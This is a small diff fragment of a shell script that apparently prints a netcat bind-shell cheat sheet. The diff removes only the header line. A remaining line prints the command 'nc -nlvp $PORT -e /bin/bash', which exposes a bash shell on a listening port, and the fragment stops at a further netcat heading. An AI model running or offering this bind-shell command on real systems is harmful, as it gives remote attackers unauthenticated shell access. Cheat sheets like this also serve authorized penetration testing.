@@ -1,4 +1,3 @@
-echo -e "\033[31m\033[1mBIND SHELL CHEAT: [netcat]\033[m"
 echo -e "\033[31m\033[1mTraditional:\033[m"
 echo -e "\t\033[1mnc -nlvp $PORT -e /bin/bash\033[m"
 echo -e "\033[31m\033[1mNetcat OpenBsd:\033[m"
